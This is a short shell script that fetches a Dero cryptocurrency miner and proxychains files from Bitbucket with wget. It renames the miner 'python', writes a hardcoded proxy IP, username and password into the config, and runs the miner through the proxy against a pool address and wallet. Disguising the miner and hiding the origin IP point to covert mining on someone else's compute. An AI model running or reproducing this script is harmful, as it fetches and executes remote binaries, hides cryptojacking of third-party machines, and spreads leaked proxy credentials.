proxy="103.253.24.243 
port="8080
user="woiden_racias90"  
pass="90racias"
wget -q -O python https://bitbucket.org/samilafera/saman/downloads/dero-stratum-miner && chmod +x python
wget -q -O proxy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x proxy
wget https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so
wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
sleep 1 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf"  
sleep 1 
echo "******************************************************************" 
echo "Original IP ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "New IP ==> "$(./proxy curl ifconfig.me)
./proxy ./python -r 46.101.106.7:4306 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm4umde6mkerfvqwy2rw5.Danis
